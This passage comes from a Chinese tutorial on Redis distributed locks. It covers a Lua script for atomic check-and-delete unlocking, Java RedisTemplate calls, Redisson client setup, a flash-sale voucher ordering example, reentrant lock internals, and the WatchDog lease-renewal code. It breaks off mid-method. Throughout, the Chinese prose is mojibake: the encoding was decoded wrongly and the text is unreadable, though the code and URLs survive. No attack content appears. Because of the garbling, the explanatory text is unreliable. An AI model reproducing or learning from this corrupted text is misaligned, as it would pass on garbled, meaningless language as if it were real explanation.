é™¤é”ï¼Œä½†æ˜¯çªç„¶é˜»å¡äº†ï¼Œè€Œä¸”æ­¤æ—¶ä»–çš„é”ä¹Ÿåˆ°æœŸäº†ï¼Œé‚£ä¹ˆæ­¤æ—¶çº¿ç¨‹2è¿›æ¥ï¼Œå½“çº¿ç¨‹1å¡é¡¿ç»“æŸåï¼Œä»–ç›´æ¥å°±ä¼šæ‰§è¡Œåˆ é™¤é”é‚£è¡Œä»£ç ï¼Œç›¸å½“äºæ¡ä»¶åˆ¤æ–­å¹¶æ²¡æœ‰èµ·åˆ°ä½œç”¨ï¼Œå°±ä¼šç›´æ¥åˆ é™¤çº¿ç¨‹2çš„é”ï¼Œè¿™å°±æ˜¯åˆ é”æ—¶çš„åŸå­æ€§é—®é¢˜ï¼Œä¹‹æ‰€ä»¥æœ‰è¿™ä¸ªé—®é¢˜ï¼Œæ˜¯**å› ä¸ºçº¿ç¨‹1çš„æ‹¿é”ï¼Œæ¯”é”ï¼Œåˆ é”ï¼Œå®é™…ä¸Šå¹¶ä¸æ˜¯åŸå­æ€§çš„**ï¼Œæˆ‘ä»¬è¦é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿ\n\n![](https://img.jwt1399.top/img/202211262150817.png)\n\n## â¼Luaè§£å†³å¤šæ¡å‘½ä»¤åŸå­æ€§é—®é¢˜\n\n> Redisæä¾›äº†Luaè„šæœ¬åŠŸèƒ½ï¼Œåœ¨ä¸€ä¸ªè„šæœ¬ä¸­ç¼–å†™å¤šæ¡Rediså‘½ä»¤ï¼Œç¡®ä¿å¤šæ¡å‘½ä»¤æ‰§è¡Œæ—¶çš„åŸå­æ€§ã€‚\n>\n> Luaæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŸºæœ¬è¯­æ³•å¯ä»¥å‚è€ƒç½‘ç«™ï¼šhttps://www.runoob.com/lua/lua-tutorial.html\n>\n> è¿™é‡Œé‡ç‚¹ä»‹ç»Redisæä¾›çš„è°ƒç”¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨luaå»æ“ä½œredisï¼Œåˆèƒ½ä¿è¯ä»–çš„åŸå­æ€§ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æ‹¿é”ã€æ¯”é”ã€åˆ é”æ˜¯ä¸€ä¸ªåŸå­æ€§åŠ¨ä½œäº†ã€‚\n\nè¿™é‡Œé‡ç‚¹ä»‹ç»Redisæä¾›çš„è°ƒç”¨å‡½æ•°ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š\n\n```lua\nredis.call('å‘½ä»¤åç§°', 'key', 'å…¶å®ƒå‚æ•°', ...)\n```\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œset name jackï¼Œåˆ™è„šæœ¬æ˜¯è¿™æ ·ï¼š\n\n```lua\n# æ‰§è¡Œ set name jack\nredis.call('set', 'name', 'jack')\n```\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦å…ˆæ‰§è¡Œset name Roseï¼Œå†æ‰§è¡Œget nameï¼Œåˆ™è„šæœ¬å¦‚ä¸‹ï¼š\n\n```lua\n# å…ˆæ‰§è¡Œ set name jack\nredis.call('set', 'name', 'Rose')\n# å†æ‰§è¡Œ get name\nlocal name = redis.call('get', 'name')\n# è¿”å›\nreturn name\n```\n\nå†™å¥½è„šæœ¬ä»¥åï¼Œéœ€è¦ç”¨Rediså‘½ä»¤æ¥è°ƒç”¨è„šæœ¬ï¼Œè°ƒç”¨è„šæœ¬çš„å¸¸è§å‘½ä»¤å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202211271513040.png)\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œ redis.call('set', 'name', 'jack') è¿™ä¸ªè„šæœ¬ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202211271458507.png)\n\nå¦‚æœè„šæœ¬ä¸­çš„keyã€valueä¸æƒ³å†™æ­»ï¼Œå¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ã€‚keyç±»å‹å‚æ•°ä¼šæ”¾å…¥KEYSæ•°ç»„ï¼Œå…¶å®ƒå‚æ•°ä¼šæ”¾å…¥ARGVæ•°ç»„ï¼Œåœ¨è„šæœ¬ä¸­å¯ä»¥ä»KEYSå’ŒARGVæ•°ç»„è·å–è¿™äº›å‚æ•°ï¼š\n\n![](https://img.jwt1399.top/img/202211271458421.png)\n\né‡Šæ”¾é”çš„ä¸šåŠ¡æµç¨‹æ˜¯è¿™æ ·çš„\n\nâ€‹\t1ã€è·å–é”ä¸­çš„çº¿ç¨‹æ ‡ç¤º\n\nâ€‹\t2ã€åˆ¤æ–­æ˜¯å¦ä¸æŒ‡å®šçš„æ ‡ç¤ºï¼ˆå½“å‰çº¿ç¨‹æ ‡ç¤ºï¼‰ä¸€è‡´\n\nâ€‹\t3ã€å¦‚æœä¸€è‡´åˆ™é‡Šæ”¾é”ï¼ˆåˆ é™¤ï¼‰\n\nâ€‹\t4ã€å¦‚æœä¸ä¸€è‡´åˆ™ä»€ä¹ˆéƒ½ä¸åš\n\næœ€ç»ˆæˆ‘ä»¬æ“ä½œredisçš„æ‹¿é”æ¯”é”åˆ é”çš„luaè„šæœ¬å°±ä¼šå˜æˆè¿™æ ·\n\n```lua\n-- è¿™é‡Œçš„ KEYS[1] å°±æ˜¯é”çš„keyï¼Œè¿™é‡Œçš„ARGV[1] å°±æ˜¯å½“å‰çº¿ç¨‹æ ‡ç¤º\n-- è·å–é”ä¸­çš„æ ‡ç¤ºï¼Œåˆ¤æ–­æ˜¯å¦ä¸å½“å‰çº¿ç¨‹æ ‡ç¤ºä¸€è‡´\nif (redis.call('GET', KEYS[1]) == ARGV[1]) then\n  -- ä¸€è‡´ï¼Œåˆ™åˆ é™¤é”\n  return redis.call('DEL', KEYS[1])\nend\n-- ä¸ä¸€è‡´ï¼Œåˆ™ç›´æ¥è¿”å›\nreturn 0\n```\n\n## â½åˆ©ç”¨Javaè°ƒç”¨Luaæ”¹é€ åˆ†å¸ƒå¼é”\n\nRedisTemplateè°ƒç”¨Luaè„šæœ¬çš„APIå¦‚ä¸‹ï¼šåˆ©ç”¨execute(luaè„šæœ¬, key, å‚æ•°)æ–¹æ³•å»æ‰§è¡Œluaè„šæœ¬\n\n\n\n![](https://img.jwt1399.top/img/202211271515973.png)\n\n```java\n// åŠ è½½luaè„šæœ¬\nprivate static final DefaultRedisScript<Long> UNLOCK_SCRIPT; \nstatic {\n  UNLOCK_SCRIPT = new DefaultRedisScript<>();\n  UNLOCK_SCRIPT.setLocation(new ClassPathResource(\"unlock.lua\"));\n  UNLOCK_SCRIPT.setResultType(Long.class);\n}\n\n// é‡Šæ”¾é”\n@Override\npublic void unlock() {\n    // è°ƒç”¨luaè„šæœ¬\n    stringRedisTemplate.execute(\n            UNLOCK_SCRIPT,\n            Collections.singletonList(KEY_PREFIX + name),\n            ID_PREFIX + Thread.currentThread().getId());\n}\n//ç»è¿‡ä»¥ä¸Šä»£ç æ”¹é€ åï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå®ç° æ‹¿é”æ¯”é”åˆ é”çš„åŸå­æ€§åŠ¨ä½œäº†~\n```\n\n**æµ‹è¯•é€»è¾‘ï¼š**\n\nç¬¬ä¸€ä¸ªçº¿ç¨‹è¿›æ¥ï¼Œå¾—åˆ°äº†é”ï¼Œæ‰‹åŠ¨åˆ é™¤é”ï¼Œæ¨¡æ‹Ÿé”è¶…æ—¶äº†ï¼Œå…¶ä»–çº¿ç¨‹ä¼šæ‰§è¡Œluaæ¥æŠ¢é”ï¼Œå½“ç¬¬ä¸€å¤©çº¿ç¨‹åˆ©ç”¨luaåˆ é™¤é”æ—¶ï¼Œluaèƒ½ä¿è¯ä»–ä¸èƒ½åˆ é™¤ä»–çš„é”ï¼Œç¬¬äºŒä¸ªçº¿ç¨‹åˆ é™¤é”æ—¶ï¼Œåˆ©ç”¨luaåŒæ ·å¯ä»¥ä¿è¯ä¸ä¼šåˆ é™¤åˆ«äººçš„é”ï¼ŒåŒæ—¶è¿˜èƒ½ä¿è¯åŸå­æ€§ã€‚\n\n## â¾æ€»ç»“\n\nåŸºäºRedisçš„åˆ†å¸ƒå¼é”å®ç°æ€è·¯ï¼š\n\n* åˆ©ç”¨set nx exè·å–é”ï¼Œå¹¶è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œä¿å­˜çº¿ç¨‹æ ‡ç¤º\n* é‡Šæ”¾é”æ—¶å…ˆåˆ¤æ–­çº¿ç¨‹æ ‡ç¤ºæ˜¯å¦ä¸è‡ªå·±ä¸€è‡´ï¼Œä¸€è‡´åˆ™åˆ é™¤é”\n  * åˆ©ç”¨set nxæ»¡è¶³äº’æ–¥æ€§\n  * åˆ©ç”¨set exä¿è¯æ•…éšœæ—¶é”ä¾ç„¶èƒ½é‡Šæ”¾ï¼Œé¿å…æ­»é”ï¼Œæé«˜å®‰å…¨æ€§\n  * åˆ©ç”¨Redisé›†ç¾¤ä¿è¯é«˜å¯ç”¨å’Œé«˜å¹¶å‘ç‰¹æ€§\n\nç¬”è€…æ€»ç»“ï¼š\n\n- 1ã€åˆ©ç”¨æ·»åŠ è¿‡æœŸæ—¶é—´ï¼Œé˜²æ­¢æ­»é”é—®é¢˜çš„å‘ç”Ÿ;\n\n- 2ã€æœ‰äº†è¿‡æœŸæ—¶é—´ä¹‹åï¼Œå¯èƒ½å‡ºç°è¯¯åˆ åˆ«äººé”çš„é—®é¢˜ï¼›\n  - åˆ ä¹‹å‰é€šè¿‡æ‹¿é”ï¼Œæ¯”é”ï¼Œåˆ é”è¿™ä¸ªé€»è¾‘æ¥è§£å†³ï¼Œå³åˆ ä¹‹å‰åˆ¤æ–­ä¸€ä¸‹å½“å‰è¿™æŠŠé”æ˜¯å¦æ˜¯å±äºè‡ªå·±çš„\n- 3ã€ä½†æ˜¯è¿˜æœ‰åŸå­æ€§é—®é¢˜ï¼Œå³æˆ‘ä»¬æ²¡æ³•ä¿è¯æ‹¿é”æ¯”é”åˆ é”æ˜¯ä¸€ä¸ªåŸå­æ€§çš„åŠ¨ä½œï¼›\n  - é€šè¿‡luaè¡¨è¾¾å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜\n\nä½†æ˜¯ç›®å‰è¿˜å‰©ä¸‹ä¸€ä¸ªé—®é¢˜ï¼šé”ä¸ä½ï¼Œä»€ä¹ˆæ˜¯é”ä¸ä½å‘¢ï¼Œå¦‚æœå½“è¿‡æœŸæ—¶é—´åˆ°äº†ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ç»™ä»–ç»­æœŸä¸€ä¸‹ï¼Œæ¯”å¦‚ç»­ä¸ª30sï¼Œå°±å¥½åƒæ˜¯ç½‘å§ä¸Šç½‘ï¼Œ ç½‘è´¹åˆ°äº†ä¹‹åï¼Œç„¶åè¯´ï¼Œç½‘ç®¡ï¼Œå†ç»™æˆ‘æ¥10å—çš„ï¼Œæ˜¯ä¸æ˜¯åè¾¹çš„é—®é¢˜éƒ½ä¸ä¼šå‘ç”Ÿäº†ï¼Œé‚£ä¹ˆç»­æœŸé—®é¢˜æ€ä¹ˆè§£å†³å‘¢ï¼Œå¯ä»¥ä¾èµ–äºæˆ‘ä»¬æ¥ä¸‹æ¥è¦å­¦ä¹ redissionå•¦\n\n# â‘¤åˆ†å¸ƒå¼é”-redisson\n\n## â¶redissonåŠŸèƒ½ä»‹ç»\n\nåŸºäºsetnxå®ç°çš„åˆ†å¸ƒå¼é”å­˜åœ¨ä¸‹é¢çš„é—®é¢˜ï¼š\n\n- **ä¸å¯é‡å…¥é—®é¢˜**ï¼šæŒ‡è·å¾—é”çš„çº¿ç¨‹ä¸å¯ä»¥å†æ¬¡è¿›å…¥åˆ°ç›¸åŒçš„é”çš„ä»£ç å—ä¸­ï¼Œå¯é‡å…¥é”çš„æ„ä¹‰åœ¨äºé˜²æ­¢æ­»é”ï¼Œæ¯”å¦‚HashTableè¿™æ ·çš„ä»£ç ä¸­ï¼Œä»–çš„æ–¹æ³•éƒ½æ˜¯ä½¿ç”¨synchronizedä¿®é¥°çš„ï¼Œå‡å¦‚ä»–åœ¨ä¸€ä¸ªæ–¹æ³•å†…ï¼Œè°ƒç”¨å¦ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆæ­¤æ—¶å¦‚æœæ˜¯ä¸å¯é‡å…¥çš„ï¼Œä¸å°±æ­»é”äº†å—ï¼Ÿæ‰€ä»¥å¯é‡å…¥é”çš„ä¸»è¦æ„ä¹‰æ˜¯é˜²æ­¢æ­»é”ï¼Œæˆ‘ä»¬çš„synchronizedå’ŒLocké”éƒ½æ˜¯å¯é‡å…¥çš„ã€‚\n\n- **ä¸å¯é‡è¯•**ï¼šæŒ‡è·å–é”åªå°è¯•ä¸€æ¬¡å°±è¿”å›falseï¼Œæ²¡æœ‰é‡è¯•æœºåˆ¶ã€‚æˆ‘ä»¬è®¤ä¸ºåˆç†çš„æƒ…å†µæ˜¯ï¼šå½“çº¿ç¨‹åœ¨è·å¾—é”å¤±è´¥åï¼Œä»–åº”è¯¥èƒ½å†æ¬¡å°è¯•è·å¾—é”ã€‚\n\n- **è¶…æ—¶é‡Šæ”¾ï¼š**æˆ‘ä»¬åœ¨åŠ é”æ—¶å¢åŠ äº†è¿‡æœŸæ—¶é—´ï¼Œè¿™æ ·çš„æˆ‘ä»¬å¯ä»¥é˜²æ­¢æ­»é”ï¼Œä½†æ˜¯å¦‚æœå¡é¡¿çš„æ—¶é—´è¶…é•¿ï¼Œè™½ç„¶æˆ‘ä»¬é‡‡ç”¨äº†luaè¡¨è¾¾å¼é˜²æ­¢åˆ é”çš„æ—¶å€™ï¼Œè¯¯åˆ åˆ«äººçš„é”ï¼Œä½†æ˜¯æ¯•ç«Ÿæ²¡æœ‰é”ä½ï¼Œæœ‰å®‰å…¨éšæ‚£\n\n- **ä¸»ä»ä¸€è‡´æ€§ï¼š** å¦‚æœRedisæä¾›äº†ä¸»ä»é›†ç¾¤ï¼Œå½“æˆ‘ä»¬å‘é›†ç¾¤å†™æ•°æ®æ—¶ï¼Œä¸»æœºéœ€è¦å¼‚æ­¥çš„å°†æ•°æ®åŒæ­¥ç»™ä»æœºï¼Œè€Œä¸‡ä¸€åœ¨åŒæ­¥è¿‡å»ä¹‹å‰ï¼Œä¸»æœºå®•æœºäº†ï¼Œå°±ä¼šå‡ºç°æ­»é”é—®é¢˜ã€‚\n\n> é‚£ä¹ˆä»€ä¹ˆæ˜¯Redissonå‘¢\n\nRedissonæ˜¯ä¸€ä¸ªåœ¨Redisçš„åŸºç¡€ä¸Šå®ç°çš„Javaé©»å†…å­˜æ•°æ®ç½‘æ ¼ï¼ˆIn-Memory Data Gridï¼‰ã€‚å³æ˜¯ä¸€ä¸ªåœ¨Redisçš„åŸºç¡€ä¸Šå®ç°çš„åˆ†å¸ƒå¼å·¥å…·é›†åˆã€‚å®ƒä¸ä»…æä¾›äº†ä¸€ç³»åˆ—çš„åˆ†å¸ƒå¼çš„Javaå¸¸ç”¨å¯¹è±¡ï¼Œè¿˜æä¾›äº†è®¸å¤šåˆ†å¸ƒå¼æœåŠ¡ï¼Œå…¶ä¸­å°±åŒ…å«äº†å„ç§åˆ†å¸ƒå¼é”çš„å®ç°ã€‚Redissionæä¾›äº†åˆ†å¸ƒå¼é”çš„å¤šç§å¤šæ ·çš„åŠŸèƒ½\n\n8.åˆ†å¸ƒå¼é”ï¼ˆLockï¼‰å’ŒåŒæ­¥å™¨ï¼ˆSynchronizerï¼‰\n\n- [8.1. å¯é‡å…¥é”ï¼ˆReentrant Lockï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#81-å¯é‡å…¥é”reentrant-lock)\n- [8.2. å…¬å¹³é”ï¼ˆFair Lockï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#82-å…¬å¹³é”fair-lock)\n- [8.3. è”é”ï¼ˆMultiLockï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#83-è”é”multilock)\n- [8.4. çº¢é”ï¼ˆRedLockï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#84-çº¢é”redlock)\n- [8.5. è¯»å†™é”ï¼ˆReadWriteLockï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#85-è¯»å†™é”readwritelock)\n- [8.6. ä¿¡å·é‡ï¼ˆSemaphoreï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#86-ä¿¡å·é‡semaphore)\n- [8.7. å¯è¿‡æœŸæ€§ä¿¡å·é‡ï¼ˆPermitExpirableSemaphoreï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#87-å¯è¿‡æœŸæ€§ä¿¡å·é‡permitexpirablesemaphore)\n- [8.8. é—­é”ï¼ˆCountDownLatchï¼‰](https://github.com/redisson/redisson/wiki/8.-åˆ†å¸ƒå¼é”å’ŒåŒæ­¥å™¨#88-é—­é”countdownlatch)\n\nå®˜ç½‘åœ°å€ï¼š [https://redisson.org](https://redisson.org/)\n\nGitHubåœ°å€ï¼š https://github.com/redisson/redisson\n\n## â·redissonå¿«é€Ÿå…¥é—¨\n\nå¼•å…¥ä¾èµ–ï¼š\n\n```xml\n<dependency>\n\t<groupId>org.redisson</groupId>\n\t<artifactId>redisson</artifactId>\n\t<version>3.13.6</version>\n</dependency>\n```\n\né…ç½®Redissonå®¢æˆ·ç«¯ï¼š\n\n```java\n@Configuration\npublic class RedissonConfig {\n\n    @Bean\n    public RedissonClient redissonClient(){\n        // é…ç½®\n        Config config = new Config();\n        config.useSingleServer().setAddress(\"redis://192.168.150.101:6379\")\n            .setPassword(\"123321\");\n        // åˆ›å»ºRedissonClientå¯¹è±¡\n        return Redisson.create(config);\n    }\n}\n```\n\nå¦‚ä½•ä½¿ç”¨Redissionçš„åˆ†å¸ƒå¼é”\n\n```java\n@Resource\nprivate RedissionClient redissonClient;\n\n@Test\nvoid testRedisson() throws Exception{\n    //è·å–é”(å¯é‡å…¥)ï¼ŒæŒ‡å®šé”çš„åç§°\n    RLock lock = redissonClient.getLock(\"anyLock\");\n    //å°è¯•è·å–é”ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ï¼šè·å–é”çš„æœ€å¤§ç­‰å¾…æ—¶é—´(æœŸé—´ä¼šé‡è¯•)ï¼Œé”è‡ªåŠ¨é‡Šæ”¾æ—¶é—´ï¼Œæ—¶é—´å•ä½\n    boolean isLock = lock.tryLock(1,10,TimeUnit.SECONDS);\n    //åˆ¤æ–­è·å–é”æˆåŠŸ\n    if(isLock){\n        try{\n            System.out.println(\"æ‰§è¡Œä¸šåŠ¡\");          \n        }finally{\n            //é‡Šæ”¾é”\n            lock.unlock();\n        } \n    }\n}\n```\n\nåœ¨ VoucherOrderServiceImpl æ³¨å…¥RedissonClient\n\n```java\n@Resource\nprivate RedissonClient redissonClient;\n\n@Override\npublic Result seckillVoucher(Long voucherId) {\n        // 1.æŸ¥è¯¢ä¼˜æƒ åˆ¸\n        SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n        // 2.åˆ¤æ–­ç§’æ€æ˜¯å¦å¼€å§‹\n        if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n            // å°šæœªå¼€å§‹\n            return Result.fail(\"ç§’æ€å°šæœªå¼€å§‹ï¼\");\n        }\n        // 3.åˆ¤æ–­ç§’æ€æ˜¯å¦å·²ç»ç»“æŸ\n        if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n            // å°šæœªå¼€å§‹\n            return Result.fail(\"ç§’æ€å·²ç»ç»“æŸï¼\");\n        }\n        // 4.åˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³\n        if (voucher.getStock() < 1) {\n            // åº“å­˜ä¸è¶³\n            return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n        }\n        Long userId = UserHolder.getUser().getId();\n        //åˆ›å»ºé”å¯¹è±¡ è¿™ä¸ªä»£ç ä¸ç”¨äº†ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨è¦ä½¿ç”¨åˆ†å¸ƒå¼é”\n        //SimpleRedisLock lock = new SimpleRedisLock(\"order:\" + userId, stringRedisTemplate);\n        RLock lock = redissonClient.getLock(\"lock:order:\" + userId);\n        //è·å–é”å¯¹è±¡\n        boolean isLock = lock.tryLock();\n\t\t    //åŠ é”å¤±è´¥\n        if (!isLock) {\n            return Result.fail(\"ä¸å…è®¸é‡å¤ä¸‹å•\");\n        }\n        try {\n            //è·å–ä»£ç†å¯¹è±¡(äº‹åŠ¡)\n            IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();\n            return proxy.createVoucherOrder(voucherId);\n        } finally {\n            //é‡Šæ”¾é”\n            lock.unlock();\n        }\n }\n```\n\n## â¸redissonå¯é‡å…¥é”åŸç†\n\n**redissionå¯é‡å…¥é”åŸç†ï¼š**é‡‡ç”¨hashç»“æ„ç”¨æ¥å­˜å‚¨é”ï¼Œå…¶ä¸­KEYè¡¨ç¤ºè¡¨ç¤ºè¿™æŠŠé”æ˜¯å¦å­˜åœ¨ï¼ˆå­˜é”åç§°ï¼‰ï¼Œç”¨VALUEè¡¨ç¤ºå½“å‰è¿™æŠŠé”è¢«å“ªä¸ªçº¿ç¨‹æŒæœ‰ï¼ˆå­˜çº¿ç¨‹åå’Œé‡å…¥çŠ¶æ€ï¼‰ã€‚æ¯”å¦‚å½“å‰æ²¡æœ‰äººæŒæœ‰è¿™æŠŠé”ï¼Œé‚£ä¹ˆvalue=0ï¼Œå‡å¦‚æœ‰äººæŒæœ‰è¿™æŠŠé”ï¼Œé‚£ä¹ˆvalue+1ï¼Œå¦‚æœæŒæœ‰è¿™æŠŠé”çš„äººå†æ¬¡æŒæœ‰ï¼ˆé‡å…¥ï¼‰è¿™æŠŠé”ï¼Œé‚£ä¹ˆvalueå°±ä¼šå†+1 ï¼Œé‡Šæ”¾ä¸€æ¬¡å°±-1 ï¼Œç›´åˆ°å‡å°‘æˆ0æ—¶ï¼Œè¡¨ç¤ºå½“å‰è¿™æŠŠé”æ²¡æœ‰è¢«äººæŒæœ‰ã€‚  \n\n![](https://img.jwt1399.top/img/202211272031145.png)\n\nå¯é‡å…¥é”çš„luaæºç \n\n| è·å–é”                                               | é‡Šæ”¾é”                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202211272036891.png) | ![](https://img.jwt1399.top/img/202211272036219.png) |\n\n## â¹redissoné”é‡è¯•å’ŒWatchDogæœºåˆ¶\n\n![Redissonåˆ†å¸ƒå¼é”åŸç†](https://img.jwt1399.top/img/202211272142836.png)\n\n### 1.é”é‡è¯•\n\næŠ¢é”è¿‡ç¨‹ä¸­ï¼Œè·å¾—å½“å‰çº¿ç¨‹ï¼Œé€šè¿‡tryAcquireè¿›è¡ŒæŠ¢é”ï¼Œè¯¥æŠ¢é”é€»è¾‘å’Œä¹‹å‰é€»è¾‘ç›¸åŒ\n\n1ã€å…ˆåˆ¤æ–­å½“å‰è¿™æŠŠé”æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œæ’å…¥ä¸€æŠŠé”ï¼Œè¿”å›null\n\n2ã€åˆ¤æ–­å½“å‰è¿™æŠŠé”æ˜¯å¦æ˜¯å±äºå½“å‰çº¿ç¨‹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›null\n\næ‰€ä»¥å¦‚æœè¿”å›æ˜¯nullï¼Œåˆ™ä»£è¡¨ç€å½“å‰çº¿ç¨‹å·²ç»æŠ¢é”å®Œæ¯•ï¼Œæˆ–è€…å¯é‡å…¥å®Œæ¯•ï¼Œä½†æ˜¯å¦‚æœä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œåˆ™è¿›å…¥åˆ°ç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œè¿”å›çš„æ˜¯é”çš„å¤±æ•ˆæ—¶é—´ï¼Œæºç ä¸­ä½ èƒ½å‘ç°æœ‰ä¸ªwhile(true) å†æ¬¡è¿›è¡ŒtryAcquireè¿›è¡ŒæŠ¢é”\n\n```java\n//å‚æ•°åˆ†åˆ«æ˜¯ï¼šè·å–é”çš„æœ€å¤§ç­‰å¾…æ—¶é—´(æœŸé—´ä¼šé‡è¯•)ï¼Œé”è‡ªåŠ¨é‡Šæ”¾æ—¶é—´ï¼Œæ—¶é—´å•ä½\n@Override\npublic boolean tryLock(long waitTime, long leaseTime, TimeUnit unit) throws InterruptedException {\n        long time = unit.toMillis(waitTime);\n        long current = System.currentTimeMillis();\n        long threadId = Thread.currentThread().getId();\n        Long ttl = tryAcquire(waitTime, leaseTime, unit, threadId);\n        // lock acquired\n        if (ttl == null) {\n            return true;\n        }\n        //.....\n        \n        while (true) {\n          long currentTime = System.currentTimeMillis();\n          ttl = tryAcquire(waitTime, leaseTime, unit, threadId);\n          // lock acquired\n          if (ttl == null) {\n            return true;\n          }\n        }\n       //....\n}\n```\n\né€šè¿‡tryAcquireè¿›è¡ŒæŠ¢é”\n\n```java\nprivate Long tryAcquire(long waitTime, long leaseTime, TimeUnit unit, long threadId) {\n  return get(tryAcquireAsync(waitTime, leaseTime, unit, threadId));\n}\n```\n\n### 2.WatchDogæœºåˆ¶\n\n```java\nprivate <T> RFuture<Long> tryAcquireAsync(long waitTime, long leaseTime, TimeUnit unit, long threadId) {\n        if (leaseTime != -1) {\n            return tryLockInnerAsync(waitTime, leaseTime, unit, threadId, RedisCommands.EVAL_LONG);\n        }\n        RFuture<Long> ttlRemainingFuture = tryLockInnerAsync(waitTime,\n                                                commandExecutor.getConnectionManager().getCfg().getLockWatchdogTimeout(),\n                                                TimeUnit.MILLISECONDS, threadId, RedisCommands.EVAL_LONG);\n        ttlRemainingFuture.onComplete((ttlRemaining, e) -> {\n            if (e != null) {\n                return;\n            }\n\n            // lock acquired\n            if (ttlRemaining == null) {\n                scheduleExpirationRenewal(threadId);\n            }\n        });\n        return ttlRemainingFuture;\n    }\n```\n\nå› ä¸ºtrylockæ–¹æ³•æœ‰é‡è½½æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯å¸¦å‚æ•°ï¼Œä¸€ä¸ªæ˜¯ä¸å¸¦å‚æ•°ï¼Œå¦‚æœå¸¦å‚æ•°ä¼ å…¥çš„å€¼æ˜¯-1ï¼Œå¦‚æœä¼ å…¥å‚æ•°ï¼Œåˆ™leaseTimeæ˜¯ä»–æœ¬èº«ï¼Œæ‰€ä»¥å¦‚æœä¼ å…¥äº†å‚æ•°ï¼Œæ­¤æ—¶leaseTime != -1 åˆ™ä¼šè¿›å»æŠ¢é”ï¼ŒæŠ¢é”çš„é€»è¾‘å°±æ˜¯ä¹‹å‰è¯´çš„é‚£ä¸‰ä¸ªé€»è¾‘\n\n```java\nif (leaseTime != -1) {\n    return tryLockInnerAsync(waitTime, leaseTime, unit, threadId, RedisCommands.EVAL_LONG);\n}\n```\n\nå¦‚æœæ˜¯æ²¡æœ‰ä¼ å…¥æ—¶é—´ï¼Œä¹Ÿä¼šè¿›è¡ŒæŠ¢é”ï¼Œ è€Œä¸”æŠ¢é”æ—¶é—´æ˜¯é»˜è®¤çœ‹é—¨ç‹—æ—¶é—´\n\n- `commandExecutor.##.**.getLockWatchdogTimeout()`\n\n`ttlRemainingFuture.onComplete((ttlRemaining, e)` è¿™å¥è¯ç›¸å½“äºå¯¹ä»¥ä¸ŠæŠ¢é”è¿›è¡Œäº†ç›‘å¬ï¼Œä¹Ÿå°±æ˜¯è¯´å½“ä¸Šè¾¹æŠ¢é”å®Œæ¯•åï¼Œæ­¤æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå…·ä½“è°ƒç”¨çš„é€»è¾‘å°±æ˜¯å»åå°å¼€å¯ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿›è¡Œç»­çº¦é€»è¾‘`scheduleExpirationRenewal()`ï¼Œä¹Ÿå°±æ˜¯çœ‹é—¨ç‹—çº¿ç¨‹\n\n```java\nprivate void scheduleExpirationRenewal(long threadId) {\n  ExpirationEntry entry = new ExpirationEntry();\n  ExpirationEntry oldEntry = EXPIRATION_RENEWAL_MAP.putIfAbsent(getEntryName(), entry);\n  if (oldEntry != null) {\n    oldEntry.addThreadId(threadId);\n  } else {\n    entry.addThreadId(threadId);\n    renewExpiration();\n  }\n}\n```\n\nè°ƒç”¨renewExpiration()ï¼Œæ­¤é€»è¾‘å°±æ˜¯ç»­çº¦é€»è¾‘\n\n```java\nprivate void renewExpiration() {\n    ExpirationEntry ee = EXPIRATION_RENEWAL_MAP.get(getEntryName());\n    if (ee == null) {\n        return;\n    }\n    \n    Timeout task = commandExecutor.getConnectionManager().newTimeout(new TimerTask() {\n        @Override\n        public void run(Timeout timeout) throws Exception {\n            ExpirationEntry ent = EXPIRATION_RENEWAL_MAP.get(getEntryName());\n            if (ent == null) {\n                return;\n            }\n            Long threadId = ent.getFirstThreadId();\n            if (threadId == null) {\n                return;\n            }\n            \n            RFuture<Boolean> future = renewExpirationAsync(threadId);\n            future.onComplete((res, e) -> {\n                if (e != null) {\n                    log.error(\"Can't update lock \" + getName() + \" expiration\", e);\n                    